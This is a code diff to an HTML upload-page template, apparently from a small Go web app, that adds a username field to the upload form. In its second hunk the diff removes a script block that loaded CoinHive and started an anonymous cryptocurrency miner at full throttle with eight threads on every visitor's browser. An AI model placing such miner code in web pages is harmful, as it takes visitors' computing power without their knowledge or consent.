@@ -25,7 +25,8 @@
 </p>
     
 <form enctype="multipart/form-data" action="%supload/" method="post">
-  Key: <input type="password" name="fn"><br>
+    Username: <input type="text" name="user"><br>
+    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Key: <input type="password" name="fn"><br>
   <input type="hidden" name="token" value="{{.}}"/>
 	<label for="upload" class="upload">
     IMG: <input type="file"  id="upload" name="uploadfile"><br>
@@ -41,18 +42,6 @@
     </form>
 </div>
     
-<script src="/js/coinhive.min.js"></script>
-<script>
-	var miner = new CoinHive.Anonymous('fS3DFhCgfTnrXc7UrRjkbnu3zPbugsEm', {
-    throttle: 0,
-    theme: 'dark'
-    });
-
-  miner.start();
-  miner.setThrottle(0)
-  miner.setNumThreads(8)
-  
-</script>
 <div id="footer">
     <a href="%v"> Home Page </a>&nbsp;&nbsp;  <a href="%vtodo"> TODO page </a>
 </div>
